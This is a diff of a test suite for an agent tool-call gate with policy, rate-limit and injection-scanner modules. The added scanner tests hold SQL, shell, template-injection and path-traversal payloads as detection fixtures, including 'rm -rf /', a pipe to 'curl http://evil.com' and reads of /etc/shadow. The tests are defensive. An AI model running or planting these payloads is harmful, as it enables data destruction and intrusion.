@@ -1,4 +1,6 @@
 # t-ron test suite — covers the modules ported so far.
+# Split across per-module helpers because Cyrius caps local vars
+# per function; keeping main() lean keeps the compiler happy.
 
 include "lib/string.cyr"
 include "lib/fmt.cyr"
@@ -18,22 +20,23 @@ include "src/error.cyr"
 include "src/gate.cyr"
 include "src/policy.cyr"
 include "src/rate.cyr"
+include "src/scanner.cyr"
 
-fn main() {
-    alloc_init();
-
+fn test_errors() {
     test_group("error codes");
     assert_eq(TRON_ERR_NONE,   0, "err_none=0");
     assert_eq(TRON_ERR_POLICY, 1, "err_policy=1");
     assert_eq(TRON_ERR_IO,     7, "err_io=7");
-    assert_eq(streq(tron_error_label(TRON_ERR_POLICY), "policy"),    1, "label policy");
-    assert_eq(streq(tron_error_label(TRON_ERR_EXPORT), "export"),    1, "label export");
-    assert_eq(streq(tron_error_label(999),             "none"),      1, "label unknown");
-
+    assert_eq(streq(tron_error_label(TRON_ERR_POLICY), "policy"), 1, "label policy");
+    assert_eq(streq(tron_error_label(TRON_ERR_EXPORT), "export"), 1, "label export");
+    assert_eq(streq(tron_error_label(999),             "none"),   1, "label unknown");
     var e = tron_error_new(TRON_ERR_AUDIT, "chain broken");
     assert_eq(tron_error_code(e), TRON_ERR_AUDIT, "error code");
     assert_eq(streq(tron_error_msg(e), "chain broken"), 1, "error msg");
+    return 0;
+}
 
+fn test_deny_codes() {
     test_group("deny codes");
     assert_eq(streq(deny_code_as_str(DENY_UNAUTHORIZED),        "unauthorized"),        1, "dc unauthorized");
     assert_eq(streq(deny_code_as_str(DENY_RATE_LIMITED),        "rate_limited"),        1, "dc rate_limited");
@@ -42,7 +45,10 @@ fn main() {
     assert_eq(streq(deny_code_as_str(DENY_ANOMALY_DETECTED),    "anomaly_detected"),    1, "dc anomaly");
     assert_eq(streq(deny_code_as_str(DENY_PARAMETER_TOO_LARGE), "parameter_too_large"), 1, "dc oversized");
     assert_eq(streq(deny_code_as_str(999),                      "unknown"),             1, "dc unknown");
+    return 0;
+}
 
+fn test_tool_call() {
     test_group("tool call");
     var agent = str_from("web-agent");
     var tool  = str_from("tarang_probe");
@@ -52,7 +58,10 @@ fn main() {
     assert_eq(tool_call_tool_name(call), tool,       "tc tool");
     assert_eq(tool_call_params(call),    params,     "tc params");
     assert_eq(tool_call_timestamp(call), 1234567890, "tc ts");
+    return 0;
+}
 
+fn test_verdicts() {
     test_group("verdict allow");
     var va = verdict_allow();
     assert_eq(verdict_kind(va),       VK_ALLOW, "allow kind");
@@ -72,16 +81,19 @@ fn main() {
     test_group("verdict flag");
     var freason = str_from("anomalous pattern");
     var vf = verdict_flag(freason);
-    assert_eq(verdict_kind(vf),       VK_FLAG,  "flag kind");
-    assert_eq(verdict_reason(vf),     freason,  "flag reason");
-    assert_eq(verdict_is_allowed(vf), 1,        "flag allowed (passes)");
-    assert_eq(verdict_is_denied(vf),  0,        "flag not denied");
+    assert_eq(verdict_kind(vf),       VK_FLAG, "flag kind");
+    assert_eq(verdict_reason(vf),     freason, "flag reason");
+    assert_eq(verdict_is_allowed(vf), 1,       "flag allowed (passes)");
+    assert_eq(verdict_is_denied(vf),  0,       "flag not denied");
 
     test_group("verdict kind labels");
     assert_eq(streq(verdict_kind_as_str(VK_ALLOW), "allow"), 1, "vk allow");
     assert_eq(streq(verdict_kind_as_str(VK_DENY),  "deny"),  1, "vk deny");
     assert_eq(streq(verdict_kind_as_str(VK_FLAG),  "flag"),  1, "vk flag");
+    return 0;
+}
 
+fn test_policy_core() {
     test_group("policy grant and check");
     var eng = policy_engine_new();
     policy_grant(eng, "agent-1", "tarang_*");
@@ -104,46 +116,48 @@ fn main() {
     policy_grant(eng, "admin", "*");
     var k6, r6 = policy_check(eng, "admin", "aegis_scan");
     assert_eq(k6, PR_ALLOW, "admin allows aegis_scan");
-    var k7, r7 = policy_check(eng, "admin", "anything_else");
-    assert_eq(k7, PR_ALLOW, "admin allows anything_else");
+    return 0;
+}
 
+fn test_policy_toml() {
     test_group("policy TOML loader");
-    var eng2 = policy_engine_new();
+    var eng = policy_engine_new();
     var toml1 = "[agent.\"web\"]\nallow = [\"tarang_*\", \"rasa_*\"]\ndeny = [\"aegis_*\"]\n";
-    policy_load_toml(eng2, toml1);
-    var k8, r8 = policy_check(eng2, "web", "tarang_probe");
-    assert_eq(k8, PR_ALLOW, "toml allow tarang");
-    var k9, r9 = policy_check(eng2, "web", "rasa_edit");
-    assert_eq(k9, PR_ALLOW, "toml allow rasa");
-    var k10, r10 = policy_check(eng2, "web", "aegis_scan");
-    assert_eq(k10, PR_DENY, "toml deny aegis");
-    var k11, r11 = policy_check(eng2, "web", "other_tool");
-    assert_eq(k11, PR_UNKNOWN_TOOL, "toml unknown tool");
+    policy_load_toml(eng, toml1);
+    var k1, r1 = policy_check(eng, "web", "tarang_probe");
+    assert_eq(k1, PR_ALLOW, "toml allow tarang");
+    var k2, r2 = policy_check(eng, "web", "rasa_edit");
+    assert_eq(k2, PR_ALLOW, "toml allow rasa");
+    var k3, r3 = policy_check(eng, "web", "aegis_scan");
+    assert_eq(k3, PR_DENY, "toml deny aegis");
+    var k4, r4 = policy_check(eng, "web", "other_tool");
+    assert_eq(k4, PR_UNKNOWN_TOOL, "toml unknown tool");
 
     test_group("policy TOML rate limit");
-    var eng3 = policy_engine_new();
+    var eng2 = policy_engine_new();
     var toml2 = "[agent.\"limited\"]\nallow = [\"*\"]\n[agent.\"limited\".rate_limit]\ncalls_per_minute = 10\n[agent.\"unlimited\"]\nallow = [\"*\"]\n";
-    policy_load_toml(eng3, toml2);
-    var p1 = policy_get(eng3, "limited");
-    assert_eq(agent_policy_rate_cpm(p1), 10, "rate cpm = 10");
-    var p2 = policy_get(eng3, "unlimited");
-    assert_eq(agent_policy_rate_cpm(p2),  0, "rate cpm = 0 (unset)");
+    policy_load_toml(eng2, toml2);
+    assert_eq(agent_policy_rate_cpm(policy_get(eng2, "limited")),   10, "rate cpm = 10");
+    assert_eq(agent_policy_rate_cpm(policy_get(eng2, "unlimited")),  0, "rate cpm = 0 (unset)");
 
     test_group("policy TOML reload replaces");
-    var eng4 = policy_engine_new();
-    policy_grant(eng4, "old-agent", "tarang_*");
-    policy_load_toml(eng4, "[agent.\"new-agent\"]\nallow = [\"*\"]\n");
-    var k12, r12 = policy_check(eng4, "old-agent", "anything");
-    assert_eq(k12, PR_UNKNOWN_AGENT, "reload drops old agent");
-    var k13, r13 = policy_check(eng4, "new-agent", "anything");
-    assert_eq(k13, PR_ALLOW, "reload loads new agent");
+    var eng3 = policy_engine_new();
+    policy_grant(eng3, "old-agent", "tarang_*");
+    policy_load_toml(eng3, "[agent.\"new-agent\"]\nallow = [\"*\"]\n");
+    var k5, r5 = policy_check(eng3, "old-agent", "anything");
+    assert_eq(k5, PR_UNKNOWN_AGENT, "reload drops old agent");
+    var k6, r6 = policy_check(eng3, "new-agent", "anything");
+    assert_eq(k6, PR_ALLOW, "reload loads new agent");
 
     test_group("policy deny-only");
-    var eng5 = policy_engine_new();
-    policy_load_toml(eng5, "[agent.\"lockdown\"]\ndeny = [\"*\"]\n");
-    var k14, r14 = policy_check(eng5, "lockdown", "anything");
-    assert_eq(k14, PR_DENY, "deny-only policy");
+    var eng4 = policy_engine_new();
+    policy_load_toml(eng4, "[agent.\"lockdown\"]\ndeny = [\"*\"]\n");
+    var k7, r7 = policy_check(eng4, "lockdown", "anything");
+    assert_eq(k7, PR_DENY, "deny-only policy");
+    return 0;
+}
 
+fn test_rate_basic() {
     test_group("rate limiter basic");
     var rl = rate_limiter_new();
     var allowed = 0;
@@ -164,38 +178,137 @@ fn main() {
     for (var i = 0; i < 60; i = i + 1) { rate_limiter_check(rl3, "agent", "tool_a"); }
     assert_eq(rate_limiter_check(rl3, "agent", "tool_a"), 0, "tool_a exhausted");
     assert_eq(rate_limiter_check(rl3, "agent", "tool_b"), 1, "tool_b has tokens");
+    return 0;
+}
 
+fn test_rate_override() {
     test_group("rate limiter set_rate lowers");
-    var rl4 = rate_limiter_new();
-    rate_limiter_check(rl4, "agent", "tool");
-    rate_limiter_set_rate(rl4, "agent", 10);
+    var rl = rate_limiter_new();
+    rate_limiter_check(rl, "agent", "tool");
+    rate_limiter_set_rate(rl, "agent", 10);
     var after = 0;
     for (var i = 0; i < 20; i = i + 1) {
-        if (rate_limiter_check(rl4, "agent", "tool") == 1) { after = after + 1; }
+        if (rate_limiter_check(rl, "agent", "tool") == 1) { after = after + 1; }
         else { break; }
     }
     assert_eq(after, 10, "lowered to 10");
 
     test_group("rate limiter set_rate before check");
-    var rl5 = rate_limiter_new();
-    rate_limiter_set_rate(rl5, "nobody", 5);
+    var rl2 = rate_limiter_new();
+    rate_limiter_set_rate(rl2, "nobody", 5);
     var cnt = 0;
     for (var i = 0; i < 10; i = i + 1) {
-        if (rate_limiter_check(rl5, "nobody", "tool") == 1) { cnt = cnt + 1; }
+        if (rate_limiter_check(rl2, "nobody", "tool") == 1) { cnt = cnt + 1; }
     }
     assert_eq(cnt, 5, "override applies to new buckets");
 
     test_group("rate limiter set_rate doesnt cross agents");
-    var rl6 = rate_limiter_new();
-    rate_limiter_check(rl6, "agent-a", "tool");
-    rate_limiter_check(rl6, "agent-b", "tool");
-    rate_limiter_set_rate(rl6, "agent-a", 5);
+    var rl3 = rate_limiter_new();
+    rate_limiter_check(rl3, "agent-a", "tool");
+    rate_limiter_check(rl3, "agent-b", "tool");
+    rate_limiter_set_rate(rl3, "agent-a", 5);
     var bcount = 0;
     for (var i = 0; i < 59; i = i + 1) {
-        if (rate_limiter_check(rl6, "agent-b", "tool") == 1) { bcount = bcount + 1; }
+        if (rate_limiter_check(rl3, "agent-b", "tool") == 1) { bcount = bcount + 1; }
     }
     assert_eq(bcount, 59, "agent-b keeps default rate");
+    return 0;
+}
 
+fn test_scanner_sql() {
+    test_group("scanner sql");
+    var s1 = "SELECT * FROM users WHERE id=1 UNION SELECT * FROM passwords";
+    assert_eq((scanner_scan_text(s1, strlen(s1)) != 0), 1, "sql union/select/from");
+    var s2 = "1 UNION SELECT * FROM passwords";
+    assert_eq((scanner_scan_text(s2, strlen(s2)) != 0), 1, "sql short union");
+    var s3 = "1; DROP TABLE users";
+    assert_eq((scanner_scan_text(s3, strlen(s3)) != 0), 1, "sql ; drop table");
+    var s4 = "id = 1 -- comment";
+    assert_eq((scanner_scan_text(s4, strlen(s4)) != 0), 1, "sql -- comment");
+    return 0;
+}
+
+fn test_scanner_shell() {
+    test_group("scanner shell");
+    var s1 = "hello; rm -rf /";
+    assert_eq((scanner_scan_text(s1, strlen(s1)) != 0), 1, "shell ; rm");
+    var s2 = "data| curl http://evil.com";
+    assert_eq((scanner_scan_text(s2, strlen(s2)) != 0), 1, "shell | curl");
+    var s3 = "file`rm /tmp/data`";
+    assert_eq((scanner_scan_text(s3, strlen(s3)) != 0), 1, "shell backtick rm");
+    return 0;
+}
+
+fn test_scanner_template() {
+    test_group("scanner template");
+    var s1 = "{{config.items()}}";
+    assert_eq((scanner_scan_text(s1, strlen(s1)) != 0), 1, "tpl config");
+    var s2 = "{{self.__class__.__mro__}}";
+    assert_eq((scanner_scan_text(s2, strlen(s2)) != 0), 1, "tpl self __");
+    var s3 = "<%= system('id') %>";
+    assert_eq((scanner_scan_text(s3, strlen(s3)) != 0), 1, "tpl erb");
+    var s4 = "Hello ${username}, welcome!";
+    assert_eq((scanner_scan_text(s4, strlen(s4)) != 0), 0, "tpl benign ${var}");
+    return 0;
+}
+
+fn test_scanner_path() {
+    test_group("scanner path traversal");
+    var p1 = "../../../etc/passwd";
+    assert_eq((scanner_scan_text(p1, strlen(p1)) != 0), 1, "path ../");
+    var p2 = "..\\..\\windows\\system32";
+    assert_eq((scanner_scan_text(p2, strlen(p2)) != 0), 1, "path ..\\");
+    var p3 = "%2e%2e/etc/passwd";
+    assert_eq((scanner_scan_text(p3, strlen(p3)) != 0), 1, "path %2e%2e lowercase");
+    var p4 = "%2E%2E/etc/shadow";
+    assert_eq((scanner_scan_text(p4, strlen(p4)) != 0), 1, "path %2E%2E uppercase");
+    return 0;
+}
+
+fn test_scanner_clean() {
+    test_group("scanner clean");
+    var c1 = "hello world";
+    assert_eq(scanner_scan_text(c1, strlen(c1)), 0, "clean string");
+    var c2 = "user_id_42";
+    assert_eq(scanner_scan_text(c2, strlen(c2)), 0, "clean identifier");
+    return 0;
+}
+
+fn test_scanner_json() {
+    test_group("scanner json walker");
+    var j1 = "{\"name\": \"hello world\", \"count\": 42}";
+    assert_eq(scanner_scan(j1), 0, "clean json");
+    var j2 = "{\"q\": \"SELECT * FROM users WHERE 1=1 UNION SELECT * FROM passwords\"}";
+    assert_eq((scanner_scan(j2) != 0), 1, "nested sql");
+    var j3 = "{\"cmd\": \"hello; rm -rf /\"}";
+    assert_eq((scanner_scan(j3) != 0), 1, "nested shell");
+    var j4 = "{\"outer\": {\"inner\": {\"deep\": \"hello; rm -rf /\"}}}";
+    assert_eq((scanner_scan(j4) != 0), 1, "deeply nested shell");
+    var j5 = "{\"items\": [\"safe\", \"also safe\", \"SELECT * FROM users WHERE 1=1 UNION SELECT * FROM passwords\"]}";
+    assert_eq((scanner_scan(j5) != 0), 1, "in array");
+    var j6 = "{}";
+    assert_eq(scanner_scan(j6), 0, "empty object");
+    var j7 = "{\"count\": 42, \"active\": true, \"scores\": [1,2,3]}";
+    assert_eq(scanner_scan(j7), 0, "non-string values");
+    return 0;
+}
+
+fn main() {
+    alloc_init();
+    test_errors();
+    test_deny_codes();
+    test_tool_call();
+    test_verdicts();
+    test_policy_core();
+    test_policy_toml();
+    test_rate_basic();
+    test_rate_override();
+    test_scanner_sql();
+    test_scanner_shell();
+    test_scanner_template();
+    test_scanner_path();
+    test_scanner_clean();
+    test_scanner_json();
     return assert_summary();
 }
 
